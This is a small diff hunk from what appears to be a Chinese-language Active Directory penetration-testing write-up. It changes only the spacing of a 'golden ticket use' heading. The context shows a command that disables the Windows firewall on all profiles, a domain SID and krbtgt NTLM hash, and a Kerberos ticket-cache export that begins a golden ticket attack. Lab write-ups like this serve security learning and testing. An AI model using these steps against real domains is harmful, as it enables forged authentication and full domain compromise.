@@ -1288,7 +1288,7 @@ netsh advfirewall set allprofiles state off
 | 域 SID          | `S-1-5-21-2952760202-1353902439-2381784089` |
 | krbtgt NTLM 哈希 | `58e91a5ac358d86513ab224312314061`          |
 
-### 黄金票据使用
+ ### 黄金票据使用
 
 ```bash
 export KRB5CCNAME=/home/kali/Administrator.ccache
